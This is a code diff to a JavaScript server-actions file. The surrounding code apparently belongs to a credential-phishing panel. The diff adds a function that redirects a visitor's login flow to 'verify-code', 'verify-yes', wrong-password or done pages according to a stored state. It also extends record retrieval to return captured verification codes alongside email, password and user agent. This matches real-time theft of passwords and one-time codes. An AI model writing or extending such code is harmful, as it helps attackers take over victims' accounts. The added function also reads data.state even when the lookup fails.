@@ -169,6 +169,26 @@ export async function getPassword(formData) {
     }
   }
 }
+export async function getUpdatePage(id) {
+  let data;
+  try {
+    await connectDB();
+    data = await Data.findById(id);
+    console.log(data.state);
+  } catch (error) {
+    console.log(error);
+  } finally {
+    if (data.state === "code") {
+      redirect("/" + data.user + "/login/password/verify-code");
+    } else if (data.state === "yes") {
+      redirect("/" + data.user + "/login/password/verify-yes");
+    } else if (data.state === "inCorrect") {
+      redirect("/" + data.user + "/login/password?wrong=true");
+    } else if (data.state === "done") {
+      redirect("/" + data.user + "/login/password?done=true");
+    }
+  }
+}
 export async function dataState(id) {
   try {
     await connectDB();
@@ -184,7 +204,7 @@ export async function getAllData() {
     await connectDB();
     const data = await User.find({ _id: id }, { data: 1, _id: 0 }).populate(
       "data",
-      "userAgent email password state"
+      "userAgent email password state code"
     );
     return JSON.stringify(data[0]);
   } catch (error) {
